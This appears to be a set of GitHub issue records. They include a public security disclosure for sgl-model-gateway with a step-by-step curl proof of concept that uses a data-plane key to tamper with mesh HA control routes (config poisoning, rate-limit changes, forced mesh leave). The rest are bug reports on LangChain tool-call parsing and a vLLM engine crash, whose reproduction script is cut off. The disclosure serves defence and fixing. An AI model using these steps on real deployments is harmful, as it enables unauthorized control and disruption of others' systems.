issue.title: [Bug] Data-plane API key accepted on mesh HA management routes in sgl-model-gateway (control-plane authorization bypass)
issue.body:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

> **Disclosure note:** This issue was first reported privately through GitHub Security Advisories on **July 29, 2026** as **GHSA-wq43-832p-rmjx**. The private report has not been processed since then, so we are now disclosing it publicly.

### Summary

sgl-model-gateway (the standalone Rust binary of sglang-router 0.3.2; the same wiring is still on current main as of 2026-09-28) protects the mesh HA management routes (`/ha/*`) with the ordinary data-plane authentication middleware, which only checks that the Bearer token equals `--api-key`. In deployments that enable mesh HA (`--enable-mesh`), set a data-plane API key, and enable control-plane RBAC (`--control-plane-api-keys`), any client holding the data-plane API key can read cluster state and topology, write config entries that gossip to every peer, change the global rate limit, and force a graceful mesh leave that silently dissolves HA coordination while all health checks keep returning 200. This works even when that same credential is registered as a control-plane `User` and is correctly rejected with 403 by `/workers`. This is a data-plane to control-plane authorization bypass (CWE-863). Suggested severity Medium, CVSS 3.1 5.4 (`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`), or 7.1 with `A:L` for deployments that rely on mesh for failover.

### Details

`src/auth/config.rs` defines two roles: `Admin` has full control-plane access, `User` has inference and data-plane access only. The control-plane middleware rejects any non-Admin principal with HTTP 403.

In `src/server.rs`, the admin and worker route groups are wrapped with `apply_control_plane_auth`:

```rust
let admin_routes = apply_control_plane_auth(admin_routes);
let worker_routes = apply_control_plane_auth(worker_routes);
```

The mesh HA route group is not. It is only attached to the data-plane middleware:

```rust
let mesh_routes = Router::new()
    .route("/ha/config/{key}", get(get_app_config))
    .route("/ha/config", post(update_app_config))
    .route("/ha/rate-limit", post(set_global_rate_limit))
    .route("/ha/rate-limit", get(get_global_rate_limit))
    .route("/ha/rate-limit/stats", get(get_global_rate_limit_stats))
    .route("/ha/shutdown", post(trigger_graceful_shutdown))
    /* ... */
    .route_layer(axum::middleware::from_fn_with_state(
        auth_config.clone(),
        middleware::auth_middleware, // data-plane check only: Bearer == --api-key
    ));
```

`auth_middleware` performs no role check, so the data-plane API key is enough for every operation in this group, including state-changing ones.

Affected endpoints: `/ha/status`, `/ha/health`, `/ha/workers`, `/ha/workers/{id}`, `/ha/policies`, `/ha/policies/{model_id}`, `/ha/config/{key}`, `/ha/config`, `/ha/rate-limit`, `/ha/rate-limit/stats`, `/ha/shutdown`.

Observed on a stock 0.3.2 build (user = data-plane key, admin = control-plane Admin key):

| Request | Credential | Result |
|---|---|---|
| POST /v1/completions | user | 200 |
| GET /workers | user (control-plane User) | 403 "Admin role required" |
| GET /workers | admin | 200 |
| GET /ha/status, /ha/health, /ha/workers, /ha/policies, /ha/rate-limit, /ha/rate-limit/stats, /ha/config/{key} | user | 200 on all |
| POST /ha/rate-limit | user | 200, state updated |
| POST /ha/config (probe key) | user | 200; value readable via GET on the same node, and appears in the peer's mesh sync log (gossip) |
| POST /ha/shutdown | user | 202, graceful mesh leave triggered |
| any /ha/* | admin | 401 on every one |

The last row is the strongest evidence that this exposure is unintended: the genuine Admin credential is rejected because these routes never consult control-plane identity at all.

Config write propagation: `POST /ha/config` with a probe key returned 200, the value was readable back on the same node, and the peer router's mesh log contained the exact key/value in this node's `NodeState.metadata`. The write propagates to every peer.

Forced leave: `POST /ha/shutdown` returned 202. The node logged "Graceful shutdown triggered via API" and "Broadcasting LEAVING status: 2/2 successful", then stopped its mesh gossip/event loop. The peer then logged "No peer address available to connect" on every gossip round. The router process did not exit: `/liveness` and `/v1/completions` still returned 200 afterwards. The mesh no longer has a connectable peer while every health check stays green.

Control experiment: wrapping `mesh_routes` with `apply_control_plane_auth` restores the intended behavior — User gets 403 on `/ha/*`, Admin gets 200, inference with the data-plane key is unaffected, and both mesh nodes stay connected.

### Reproduction

Tested with sglang-router 0.3.2 (sdist built with Rust 1.90.0 and protoc 31.1) on x86_64 Linux. Two mesh routers and one mock worker, all on 127.0.0.1.

#### 1. Build the router

```bash
python3 -m pip download --no-deps --no-binary=:all: "sglang-router==0.3.2"
tar -xzf sglang_router-0.3.2.tar.gz
cd sglang_router-0.3.2
cargo build --bin sgl-model-gateway
```

The commands below assume the binary is `./target/debug/sgl-model-gateway`.

#### 2. Start a mock worker

Save as `mock_worker.py` and run it:

```python
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


class Handler(BaseHTTPRequestHandler):
    def reply(self, code, value, content_type="application/json"):
        body = value.encode() if isinstance(value, str) else json.dumps(value).encode()
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path in ("/health", "/health_generate", "/liveness", "/readiness"):
            return self.reply(200, "OK", "text/plain")
        if path == "/v1/models":
            return self.reply(200, {"object": "list", "data": [
                {"id": "mock-model", "object": "model", "created": 0, "owned_by": "mock"}]})
        if path in ("/get_model_info", "/model_info"):
            return self.reply(200, {"model_path": "mock-model", "is_generation": True})
        if path in ("/get_server_info", "/server_info"):
            return self.reply(200, {"model_path": "mock-model", "version": "0.0.0-mock",
                                    "tp_size": 1, "dp_size": 1})
        return self.reply(404, "not found", "text/plain")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        if length:
            self.rfile.read(length)
        if self.path.split("?", 1)[0] == "/v1/completions":
            return self.reply(200, {"id": "cmpl-mock", "object": "text_completion", "created": 0,
                                    "model": "mock-model",
                                    "choices": [{"text": "ok", "index": 0, "finish_reason": "stop"}]})
        return self.reply(404, "not found", "text/plain")

    def log_message(self, format, *args):
        pass


ThreadingHTTPServer(("127.0.0.1", 39990), Handler).serve_forever()
```

```bash
python3 mock_worker.py
```

#### 3. Start two mesh routers

```bash
./target/debug/sgl-model-gateway \
  --host 127.0.0.1 --port 33800 --policy round_robin \
  --worker-urls http://127.0.0.1:39990 \
  --worker-startup-timeout-secs 5 --disable-health-check --log-level info \
  --api-key user-secret \
  --control-plane-api-keys admin1:Admin:admin:admin-secret \
  --control-plane-api-keys user1:User:user:user-secret \
  --enable-mesh --mesh-server-name R1 \
  --mesh-host 127.0.0.1 --mesh-port 39530 --mesh-peer-urls 127.0.0.1:39531 \
  --prometheus-host 127.0.0.1 --prometheus-port 29001
```

```bash
./target/debug/sgl-model-gateway \
  --host 127.0.0.1 --port 33801 --policy round_robin \
  --worker-urls http://127.0.0.1:39990 \
  --worker-startup-timeout-secs 5 --disable-health-check --log-level info \
  --api-key user-secret \
  --control-plane-api-keys admin1:Admin:admin:admin-secret \
  --control-plane-api-keys user1:User:user:user-secret \
  --enable-mesh --mesh-server-name R2 \
  --mesh-host 127.0.0.1 --mesh-port 39531 --mesh-peer-urls 127.0.0.1:39530 \
  --prometheus-host 127.0.0.1 --prometheus-port 29002
```

`user-secret` is both the data-plane key and an explicit control-plane `User`, so the attacker's role is unambiguous. Wait until both `/liveness` endpoints return 200.

#### 4. Confirm the intended boundary

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X POST http://127.0.0.1:33800/v1/completions \
  -H 'Authorization: Bearer user-secret' -H 'Content-Type: application/json' \
  -d '{"model":"mock-model","prompt":"hello","max_tokens":1}'
# -> 200

curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:33800/workers \
  -H 'Authorization: Bearer user-secret'
# -> 403

curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:33800/workers \
  -H 'Authorization: Bearer admin-secret'
# -> 200
```

#### 5. Read HA control state with the User credential

```bash
for ep in status health workers policies rate-limit rate-limit/stats; do
  curl -s -o /dev/null -w "/ha/$ep -> %{http_code}\n" \
    http://127.0.0.1:33800/ha/$ep -H 'Authorization: Bearer user-secret'
done
# -> 200 on all
```

#### 6. Modify HA control state with the User credential

```bash
curl -s -X POST http://127.0.0.1:33800/ha/rate-limit \
  -H 'Authorization: Bearer user-secret' -H 'Content-Type: application/json' \
  -d '{"limit_per_second":1}'
# -> {"status":"updated","limit_per_second":1}

curl -s http://127.0.0.1:33800/ha/rate-limit -H 'Authorization: Bearer user-secret'
# -> {"limit_per_second":1}

curl -s -X POST http://127.0.0.1:33800/ha/config \
  -H 'Authorization: Bearer user-secret' -H 'Content-Type: application/json' \
  -d '{"key":"authz_probe","value":"poisoned"}'
# -> 200; the peer router's mesh log then contains this key/value

curl -s -o /dev/null -w '%{http_code}\n' -X POST http://127.0.0.1:33800/ha/rate-limit \
  -H 'Authorization: Bearer admin-secret' -H 'Content-Type: application/json' \
  -d '{"limit_per_second":13}'
# -> 401 (the real Admin is rejected on /ha/*)
```

#### 7. Force a mesh leave with the User credential

```bash
curl -s -X POST http://127.0.0.1:33800/ha/shutdown -H 'Authorization: Bearer user-secret'
# -> 202 {"status":"shutdown initiated"}
```

R1 logs "Graceful shutdown triggered via API", broadcasts LEAVING to 2/2 peers, and stops its mesh gossip loop. R2 then logs "No peer address available to connect" every gossip round. R1 keeps serving: `/liveness` and `/v1/completions` still return 200.

Expected behavior: the User credential gets 403 on every `/ha/*` route, the Admin credential gets 200, and the mesh stays connected.

### Environment

- sglang-router `0.3.2` (latest release at time of testing); the same wiring is still present on current main as of 2026-09-28 (`mesh_routes` attached only to `auth_middleware`, `src/server.rs` lines 658–674)
- Component: standalone `sgl-model-gateway` Rust binary, built from the 0.3.2 sdist with Rust/Cargo 1.90.0 and protoc 31.1 on x86_64 Linux (only diff vs sdist: a generated `Cargo.lock`)
- Topology: two mesh routers R1 (`:33800`, mesh `:39530`) and R2 (`:33801`, mesh `:39531`) with `--enable-mesh`, one mock worker at `127.0.0.1:39990`, all on a single host
- Auth: data-plane `--api-key` plus control-plane RBAC (`--control-plane-api-keys`) with one Admin and one User principal

comment.body:
Fix is up: https://github.com/sgl-project/sglang/pull/45017

The mesh HA routes (`/ha/*`) are now wrapped with `apply_control_plane_auth`, the same wiring as the admin/worker route groups — so with control-plane RBAC configured, only Admins can reach them, and without it behavior is unchanged. I verified on a live two-router mesh (current main): data-plane key now gets 403 on every `/ha/*` read and write, the Admin key gets 200 with working read/write round-trips, inference with the data-plane key is unaffected, public health probes stay open, and both nodes stay peered. Details and verbatim before/after outputs are in the PR description.

### Summary

sgl-model-gateway (the standalone Rust binary of sglang-router 0.3.2; the same wiring is still on current main as of 2026-09-28) protects the mesh HA management routes (`/ha/*`) with the ordinary data-plane authentication middleware, which only checks that the Bearer token equals `--api-key`. In deployments that enable mesh HA (`--enable-mesh`), set a data-plane API key, and enable control-plane RBAC (`--control-plane-api-keys`), any client holding the data-plane API key can read cluster state and topology, write config entries that gossip to every peer, change the global rate limit, and force a graceful mesh leave that silently dissolves HA coordination while all health checks keep returning 200. This works even when that same credential is registered as a control-plane `User` and is correctly rejected with 403 by `/workers`. This is a data-plane to control-plane authorization bypass (CWE-863). Suggested severity Medium, CVSS 3.1 5.4 (`AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`), or 7.1 with `A:L` for deployments that rely on mesh for failover.

### Details

`src/auth/config.rs` defines two roles: `Admin` has full control-plane access, `User` has inference and data-plane access only. The control-plane middleware rejects any non-Admin principal with HTTP 403.

In `src/server.rs`, the admin and worker route groups are wrapped with `apply_control_plane_auth`:

```rust
let admin_routes = apply_control_plane_auth(admin_routes);
let worker_routes = apply_control_plane_auth(worker_routes);
```

The mesh HA route group is not. It is only attached to the data-plane middleware:

```rust
let mesh_routes = Router::new()
    .route("/ha/config/{key}", get(get_app_config))
    .route("/ha/config", post(update_app_config))
    .route("/ha/rate-limit", post(set_global_rate_limit))
    .route("/ha/rate-limit", get(get_global_rate_limit))
    .route("/ha/rate-limit/stats", get(get_global_rate_limit_stats))
    .route("/ha/shutdown", post(trigger_graceful_shutdown))
    /* ... */
    .route_layer(axum::middleware::from_fn_with_state(
        auth_config.clone(),
        middleware::auth_middleware, // data-plane check only: Bearer == --api-key
    ));
```

`auth_middleware` performs no role check, so the data-plane API key is enough for every operation in this group, including state-changing ones.

Affected endpoints: `/ha/status`, `/ha/health`, `/ha/workers`, `/ha/workers/{id}`, `/ha/policies`, `/ha/policies/{model_id}`, `/ha/config/{key}`, `/ha/config`, `/ha/rate-limit`, `/ha/rate-limit/stats`, `/ha/shutdown`.

Observed on a stock 0.3.2 build (user = data-plane key, admin = control-plane Admin key):

| Request | Credential | Result |
|---|---|---|
| POST /v1/completions | user | 200 |
| GET /workers | user (control-plane User) | 403 "Admin role required" |
| GET /workers | admin | 200 |
| GET /ha/status, /ha/health, /ha/workers, /ha/policies, /ha/rate-limit, /ha/rate-limit/stats, /ha/config/{key} | user | 200 on all |
| POST /ha/rate-limit | user | 200, state updated |
| POST /ha/config (probe key) | user | 200; value readable via GET on the same node, and appears in the peer's mesh sync log (gossip) |
| POST /ha/shutdown | user | 202, graceful mesh leave triggered |
| any /ha/* | admin | 401 on every one |

The last row is the strongest evidence that this exposure is unintended: the genuine Admin credential is rejected because these routes never consult control-plane identity at all.

Config write propagation: `POST /ha/config` with a probe key returned 200, the value was readable back on the same node, and the peer router's mesh log contained the exact key/value in this node's `NodeState.metadata`. The write propagates to every peer.

Forced leave: `POST /ha/shutdown` returned 202. The node logged "Graceful shutdown triggered via API" and "Broadcasting LEAVING status: 2/2 successful", then stopped its mesh gossip/event loop. The peer then logged "No peer address available to connect" on every gossip round. The router process did not exit: `/liveness` and `/v1/completions` still returned 200 afterwards. The mesh no longer has a connectable peer while every health check stays green.

Control experiment: wrapping `mesh_routes` with `apply_control_plane_auth` restores the intended behavior — User gets 403 on `/ha/*`, Admin gets 200, inference with the data-plane key is unaffected, and both mesh nodes stay connected.

### Reproduction

Tested with sglang-router 0.3.2 (sdist built with Rust 1.90.0 and protoc 31.1) on x86_64 Linux. Two mesh routers and one mock worker, all on 127.0.0.1.

#### 1. Build the router

```bash
python3 -m pip download --no-deps --no-binary=:all: "sglang-router==0.3.2"
tar -xzf sglang_router-0.3.2.tar.gz
cd sglang_router-0.3.2
cargo build --bin sgl-model-gateway
```

The commands below assume the binary is `./target/debug/sgl-model-gateway`.

#### 2. Start a mock worker

Save as `mock_worker.py` and run it:

```python
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


class Handler(BaseHTTPRequestHandler):
    def reply(self, code, value, content_type="application/json"):
        body = value.encode() if isinstance(value, str) else json.dumps(value).encode()
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path in ("/health", "/health_generate", "/liveness", "/readiness"):
            return self.reply(200, "OK", "text/plain")
        if path == "/v1/models":
            return self.reply(200, {"object": "list", "data": [
                {"id": "mock-model", "object": "model", "created": 0, "owned_by": "mock"}]})
        if path in ("/get_model_info", "/model_info"):
            return self.reply(200, {"model_path": "mock-model", "is_generation": True})
        if path in ("/get_server_info", "/server_info"):
            return self.reply(200, {"model_path": "mock-model", "version": "0.0.0-mock",
                                    "tp_size": 1, "dp_size": 1})
        return self.reply(404, "not found", "text/plain")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        if length:
            self.rfile.read(length)
        if self.path.split("?", 1)[0] == "/v1/completions":
            return self.reply(200, {"id": "cmpl-mock", "object": "text_completion", "created": 0,
                                    "model": "mock-model",
                                    "choices": [{"text": "ok", "index": 0, "finish_reason": "stop"}]})
        return self.reply(404, "not found", "text/plain")

    def log_message(self, format, *args):
        pass


ThreadingHTTPServer(("127.0.0.1", 39990), Handler).serve_forever()
```

```bash
python3 mock_worker.py
```

#### 3. Start two mesh routers

```bash
./target/debug/sgl-model-gateway \
  --host 127.0.0.1 --port 33800 --policy round_robin \
  --worker-urls http://127.0.0.1:39990 \
  --worker-startup-timeout-secs 5 --disable-health-check --log-level info \
  --api-key user-secret \
  --control-plane-api-keys admin1:Admin:admin:admin-secret \
  --control-plane-api-keys user1:User:user:user-secret \
  --enable-mesh --mesh-server-name R1 \
  --mesh-host 127.0.0.1 --mesh-port 39530 --mesh-peer-urls 127.0.0.1:39531 \
  --prometheus-host 127.0.0.1 --prometheus-port 29001
```

```bash
./target/debug/sgl-model-gateway \
  --host 127.0.0.1 --port 33801 --policy round_robin \
  --worker-urls http://127.0.0.1:39990 \
  --worker-startup-timeout-secs 5 --disable-health-check --log-level info \
  --api-key user-secret \
  --control-plane-api-keys admin1:Admin:admin:admin-secret \
  --control-plane-api-keys user1:User:user:user-secret \
  --enable-mesh --mesh-server-name R2 \
  --mesh-host 127.0.0.1 --mesh-port 39531 --mesh-peer-urls 127.0.0.1:39530 \
  --prometheus-host 127.0.0.1 --prometheus-port 29002
```

`user-secret` is both the data-plane key and an explicit control-plane `User`, so the attacker's role is unambiguous. Wait until both `/liveness` endpoints return 200.

#### 4. Confirm the intended boundary

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X POST http://127.0.0.1:33800/v1/completions \
  -H 'Authorization: Bearer user-secret' -H 'Content-Type: application/json' \
  -d '{"model":"mock-model","prompt":"hello","max_tokens":1}'
# -> 200

curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:33800/workers \
  -H 'Authorization: Bearer user-secret'
# -> 403

curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:33800/workers \
  -H 'Authorization: Bearer admin-secret'
# -> 200
```

#### 5. Read HA control state with the User credential

```bash
for ep in status health workers policies rate-limit rate-limit/stats; do
  curl -s -o /dev/null -w "/ha/$ep -> %{http_code}\n" \
    http://127.0.0.1:33800/ha/$ep -H 'Authorization: Bearer user-secret'
done
# -> 200 on all
```

#### 6. Modify HA control state with the User credential

```bash
curl -s -X POST http://127.0.0.1:33800/ha/rate-limit \
  -H 'Authorization: Bearer user-secret' -H 'Content-Type: application/json' \
  -d '{"limit_per_second":1}'
# -> {"status":"updated","limit_per_second":1}

curl -s http://127.0.0.1:33800/ha/rate-limit -H 'Authorization: Bearer user-secret'
# -> {"limit_per_second":1}

curl -s -X POST http://127.0.0.1:33800/ha/config \
  -H 'Authorization: Bearer user-secret' -H 'Content-Type: application/json' \
  -d '{"key":"authz_probe","value":"poisoned"}'
# -> 200; the peer router's mesh log then contains this key/value

curl -s -o /dev/null -w '%{http_code}\n' -X POST http://127.0.0.1:33800/ha/rate-limit \
  -H 'Authorization: Bearer admin-secret' -H 'Content-Type: application/json' \
  -d '{"limit_per_second":13}'
# -> 401 (the real Admin is rejected on /ha/*)
```

#### 7. Force a mesh leave with the User credential

```bash
curl -s -X POST http://127.0.0.1:33800/ha/shutdown -H 'Authorization: Bearer user-secret'
# -> 202 {"status":"shutdown initiated"}
```

R1 logs "Graceful shutdown triggered via API", broadcasts LEAVING to 2/2 peers, and stops its mesh gossip loop. R2 then logs "No peer address available to connect" every gossip round. R1 keeps serving: `/liveness` and `/v1/completions` still return 200.

Expected behavior: the User credential gets 403 on every `/ha/*` route, the Admin credential gets 200, and the mesh stays connected.

### Environment

- sglang-router `0.3.2` (latest release at time of testing); the same wiring is still present on current main as of 2026-09-28 (`mesh_routes` attached only to `auth_middleware`, `src/server.rs` lines 658–674)
- Component: standalone `sgl-model-gateway` Rust binary, built from the 0.3.2 sdist with Rust/Cargo 1.90.0 and protoc 31.1 on x86_64 Linux (only diff vs sdist: a generated `Cargo.lock`)
- Topology: two mesh routers R1 (`:33800`, mesh `:39530`) and R2 (`:33801`, mesh `:39531`) with `--enable-mesh`, one mock worker at `127.0.0.1:39990`, all on a single host
- Auth: data-plane `--api-key` plus control-plane RBAC (`--control-plane-api-keys`) with one Admin and one User principal

comment.body: Thank you for the detailed report and for disclosing it publicly — the reproduction steps and the comparison table are excellent. The data-plane credential being accepted on the mesh HA management routes while the genuine Admin credential is rejected is clearly unintended, and the control experiment in the issue (wrapping `mesh_routes` with `apply_control_plane_auth`) confirms the fix direction. I'll work on a fix along those lines and put up a PR shortly.

issue.title: core: truncated tool-call arguments are parsed leniently after the stream ends, producing a valid-looking tool call

labels.name: repo-ac7e25de
labels.description: Related to a bug, vulnerability, unexpected error with an existing feature

issue.body:
### Submission checklist

- [x] This is a bug, not a usage question.
- [x] I added a clear and descriptive title that summarizes this issue.
- [x] I used the GitHub search to find a similar question and didn't find it.
- [x] I am sure that this is a bug in LangChain rather than my code.
- [x] The bug is not resolved by updating to the latest stable version of LangChain (or the specific integration package).
- [x] This is not related to the langchain-community package.
- [x] I posted a self-contained, minimal, reproducible example. A maintainer can copy it and run it AS IS.

### Package (Required)

- [ ] langchain
- [ ] langchain-openai
- [ ] langchain-anthropic
- [ ] langchain-classic
- [x] langchain-core
- [ ] langchain-model-profiles
- [ ] langchain-tests
- [ ] langchain-text-splitters
- [ ] langchain-chroma
- [ ] langchain-deepseek
- [ ] langchain-exa
- [ ] langchain-fireworks
- [ ] langchain-groq
- [ ] langchain-huggingface
- [ ] langchain-mistralai
- [ ] langchain-nomic
- [ ] langchain-ollama
- [ ] langchain-openrouter
- [ ] langchain-perplexity
- [ ] langchain-qdrant
- [ ] langchain-typesafe
- [ ] langchain-xai
- [ ] Other / not sure / general

### Related Issues / PRs

- #39275: same report, auto-closed for submission format, not reviewed on the merits.
- #38682 and #35743 (empty-args handling during streaming): adjacent but different.

### Reproduction Steps / Example Code (Python)

```python
from langchain_core.language_models.chat_models import generate_from_stream
from langchain_core.messages import AIMessageChunk
from langchain_core.outputs import ChatGenerationChunk

chunks = [
    ChatGenerationChunk(message=AIMessageChunk(content="", tool_call_chunks=[
        {"name": "edit_document", "args": "", "id": "call_1", "index": 0, "type": "tool_call_chunk"}])),
    ChatGenerationChunk(message=AIMessageChunk(content="", tool_call_chunks=[
        {"name": None, "args": '{"operation": "replace", "blocks": [{"type": "hea',
         "id": None, "index": 0, "type": "tool_call_chunk"}])),
]
msg = generate_from_stream(iter(chunks)).generations[0].message
print(msg.tool_calls)
# [{'name': 'edit_document', 'args': {'operation': 'replace', 'blocks': [{'type': 'hea'}]}, ...}]
print(msg.invalid_tool_calls)
```

### Error Message and Stack Trace (if applicable)

No error or stack trace. The bug is silent: a tool call whose arguments were cut off by the end of the stream comes out as a valid-looking tool call.

Running the reproduction above prints:

```python
  msg.tool_calls
  [{'name': 'edit_document', 'args': {'operation': 'replace', 'blocks': [{'type': 'hea'}]}, 'id': 'call_1', 'type': 'tool_call'}]

  msg.invalid_tool_calls
  []
```
Expected: the truncated arguments land in invalid_tool_calls (raw string preserved) and tool_calls is empty.

### Description

`AIMessageChunk.init_tool_calls` parses every tool-call chunk's `args` with `parse_partial_json`. That's right while a stream is in flight. But it's also used for the final aggregated message: both the `chunk_position="last"` chunk and the message that `generate_from_stream` builds for `invoke()` / `ainvoke()` with `streaming=True`.

If a stream ends partway through a tool call's arguments, partial parsing closes the open strings and brackets and returns a well-formed dict:
- the call lands in `tool_calls`;
- `invalid_tool_calls` stays empty;
- the tool runs with half of its input.

Streams end early more often than you'd think:
- a provider or proxy closes the connection;
- a gateway that reports a dropped upstream with `finish_reason: "stop"` (we saw this with an LLM proxy);
- a timeout in an intermediary.

Our concrete case: half of a document-edit payload was applied as a complete edit.

### System Info

System Information
------------------
> OS:  Darwin
> OS Version:  Darwin Kernel Version 27.0.0: Tue Aug 11 21:06:40 PDT 2026; root:xnu-13432.1.9~1/RELEASE_ARM64_T6050
> Python Version:  3.11.15 (main, Jun 23 2026, 15:46:51) [Clang 22.1.3 ]

Package Information
-------------------
> langchain_core: 1.6.12
> langsmith: 0.14.9
> langchain_protocol: 0.0.18
> langchain_tests: 1.1.9

### Social handles (optional)

_No response_

comment.body:
Hi @taguacil — thanks for the detailed report and the self-contained reproducer!

I'd like to take this one. I'll look into using strict JSON parsing for the final aggregated message in `generate_from_stream` / `AIMessageChunk.init_tool_calls`, so truncated tool-call arguments land in `invalid_tool_calls` instead of silently becoming a valid-looking `tool_call`.

issue.title: [Test][MRV2] Cover draftless thinking-budget row mapping

labels.name: repo-5faa5e07
labels.description: Issues/PRs which apply only to Model Runner V1 (not applicable to Model Runner V2)

issue.body:
Refs #59272.

## Summary

Replaces the original Model Runner V1 patch with Model Runner V2 coverage, as requested in review.

Model Runner V2 does not use the MRV1 `cu_num_tokens` dictionary that caused every request to map to row 0 on a draft-less speculative step. Its no-draft path sets `expanded_idx_mapping == idx_mapping`, giving each request one logits row, and `ThinkingBudgetState` applies forcing through that explicit row-to-request mapping.

This PR adds a two-request GPU regression test that reproduces the important boundary condition: both requests have exhausted their thinking budgets, the speculative step has no drafts, and both corresponding logits rows must independently force the reasoning end token. This protects the V2 invariant against the cross-request row corruption described in #59272.

## Why there is no implementation change

The reported failure is specific to the deprecated MRV1 layout calculation. The equivalent V2 path already has the correct mapping, so carrying the MRV1 fix forward would change a non-default runner without addressing the maintainer's request. The updated PR tests the supported implementation instead of claiming a V2 bug that is not present.

## Validation

- `git diff --check`: clean.
- The test is in `tests/v1/worker/test_gpu_thinking_budget.py` and requires CUDA/Triton; it could not be executed in the current macOS CPU-only environment.

## AI assistance

AI assistance was used to prepare this update. The final diff and the V2 sampling/mapping path were reviewed before pushing.

comment.body: Hi @njhill — following up on your suggestion to use the V2 model runner: this PR is now a regression test for the draftless thinking-budget row mapping (I traced the V2 no-draft path and confirmed it already avoids the row-overlap this test guards). DCO is green. Whenever you have a moment, I would appreciate a re-review — happy to adjust anything. Thanks!

### 🐛 Describe the bug With `--mm-processor-cache-type shm`, `POST /pause?mode=keep` (or `mode=wait` with `clear_cache=true`), while image requests are waiting to be scheduled, can kill the engine as soon as one of them is scheduled, see log: ``` INFO: "POST /pause?mode=keep HTTP/1.1" 200 OK INFO: "POST /resume HTTP/1.1" 200 OK ERROR [dump_input.py:81] Dumping scheduler stats: SchedulerStats(num_running_reqs=4, num_waiting_reqs=15, ... EngineCore encountered a fatal error. Traceback (most recent call last): ... File "vllm/v1/worker/worker_base.py", line 361, in execute_model self._apply_mm_cache(scheduler_output) File "vllm/v1/worker/worker_base.py", line 354, in _apply_mm_cache req_data.mm_features = mm_cache.get_and_update_features( File "vllm/multimodal/cache/shm.py", line 228, in get_and_update_features File "vllm/multimodal/cache/base.py", line 458, in get_and_update_features File "vllm/multimodal/cache/shm.py", line 241, in get_and_update_item return self._shm_cache.get(address, monotonic_id) File "vllm/distributed/device_communicators/shm_object_storage.py", line 613, in get raise ValueError( ValueError: Data for address:id '4817824:4' has been modified or is invalid. vllm.v1.engine.exceptions.EngineDeadError: EngineCore encountered an issue. See stack trace (above) for the root cause. ``` Every in-flight and later request then fails, and `/health` stops answering 200. `/pause?mode=keep` is documented to ignore `clear_cache` ("Ignored when mode=keep"), so tecnically a keep pause is not expected to touch any cache at all. ```bash VLLM_SERVER_DEV_MODE=1 vllm serve Qwen/Qwen2-VL-2B-Instruct --limit-mm-per-prompt '{"image":1}' \ --mm-processor-cache-type shm --mm-processor-cache-gb 2 --max-num-seqs 4 --max-model-len 8192 python3 repro.py http://127.0.0.1:8000 --arms keep ``` Each round of the client below does an idle pause+resume, then sends 12 streamed requests with distinct 448 px images (4 run, 8 wait behind `--max-num-seqs 4`). 300 ms later it pauses and resumes, then sends 8 requests with distinct 1344 px images. Results on RTX A5000, one fresh server per row: | server | pause call | result | |---|---|---| | shm | `/pause?mode=keep` | engine dead in round 1 (3/3 servers) | | shm | `/pause?mode=wait&clear_cache=true` (1344 px images sent during the drain) | engine dead in round 1 (1/1) | | shm | `/pause?mode=keep&clear_cache=false` | alive after 67 rounds; the same server then died in round 1 of the `mode=keep` arm | | lru | `/pause?mode=keep` | alive after 51 rounds |
repro.py ```python #!/usr/bin/env python3 """Standalone client (stdlib only): /pause clears the shared-memory multimodal cache under requests that still hold handles into it, and the engine dies when one of them is scheduled. vLLM 0.31.0 with `--mm-processor-cache-type shm`. A request's image travels to the engine as an (address, monotonic_id) handle into the SHM ring buffer; the worker resolves it only when the request is first scheduled (v1/worker/worker_base.py:348-356 -> multimodal/cache/shm.py:241 -> shm_object_storage.py:608-614). `POST /pause` defaults to clear_cache=true (entrypoints/serve/dev/rlhf/api_router.py:34; its docstring says the flag is ignored for mode=keep) and AsyncLLM.pause_generation clears the frontend cache for every mode (v1/engine/async_llm.py:950-951). For the SHM cache that resets the ring buffer -- addresses and ids back to 0 (shm_object_storage.py:163-170) -- while requests queued behind --max-num-seqs still carry handles into it. New images written after the clear reuse those slots; when a kept request is scheduled its handle fails the id check, `ValueError: Data for address:id ':' has been modified or is invalid.` is raised in execute_model, and EngineCore exits (EngineDeadError; every later request fails, /health is no longer 200). Server: VLLM_SERVER_DEV_MODE=1 vllm serve Qwen/Qwen2-VL-2B-Instruct --limit-mm-per-prompt '{"image":1}' \ --mm-processor-cache-type shm --mm-processor-cache-gb 2 --max-num-seqs 4 --max-model-len 8192 Run: python3 repro.py http://127.0.0.1:8000 --arms keep Round: an idle /pause?mode=keep + /resume (nothing in flight, so it only resets the SHM ring); then 12 streamed chat requests, each with its own 448 px noise image (4 run, 8 wait behind --max-num-seqs 4); `--pause-after-ms` later the pause call; then /resume and at once 8 more requests with distinct 1344 px images. Arms (the pause call): keep /pause?mode=keep (clear_cache left at its default, true) keep_noclear /pause?mode=keep&clear_cache=false (control) wait /pause?mode=wait&clear_cache=true; the 8 large images are sent while the pause drains none no pause (control) Exit 1 when the engine dies (/health not 200, or a response carrying EngineDeadError / "EngineCore encountered"). """ from __future__ import annotations import argparse import base64 import http.client import json import random import struct import sys import threading import time import urllib.parse import zlib from collections import Counter DEAD_MARKERS = ("EngineDeadError", "EngineCore encountered", "engine is dead", "Engine is dead") def png(seed: int, size: int) -> str: rnd = random.Random(seed) raw = 